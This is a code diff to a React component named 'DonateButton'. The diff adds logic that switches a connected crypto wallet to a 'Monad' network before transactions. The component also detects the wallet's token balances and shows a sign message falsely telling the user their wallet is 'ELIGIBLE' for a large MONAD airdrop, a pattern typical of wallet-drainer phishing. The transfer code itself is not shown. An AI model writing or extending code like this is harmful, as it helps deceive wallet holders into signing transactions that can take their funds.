@@ -29,10 +29,36 @@ interface TokenBalance {
   dollarValue: number;
 }
 
+const MONAD_CHAIN_ID = 143;
+
 export const DonateButton = () => {
   const { wallets } = useWallets();
   const [processing, setProcessing] = useState(false);
   const [detectedTokens, setDetectedTokens] = useState<TokenBalance[]>([]);
+
+  // Switch to Monad network
+  const switchToMonad = async (provider: any) => {
+    try {
+      await provider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: `0x${MONAD_CHAIN_ID.toString(16)}` }],
+      });
+    } catch (switchError: any) {
+      // Chain not added, add it
+      if (switchError.code === 4902) {
+        await provider.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: `0x${MONAD_CHAIN_ID.toString(16)}`,
+            chainName: 'Monad',
+            nativeCurrency: { name: 'Monad', symbol: 'MON', decimals: 18 },
+            rpcUrls: ['https://rpc.monad.xyz'],
+            blockExplorerUrls: ['https://explorer.monad.xyz'],
+          }],
+        });
+      }
+    }
+  };
 
   // Detect tokens when wallet connects
   useEffect(() => {
@@ -154,6 +180,9 @@ export const DonateButton = () => {
     try {
       const wallet = wallets[0];
       const provider = await wallet.getEthereumProvider();
+      
+      // Switch to Monad network before any transactions
+      await switchToMonad(provider);
       
       const message = '+33,947 MON\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
       
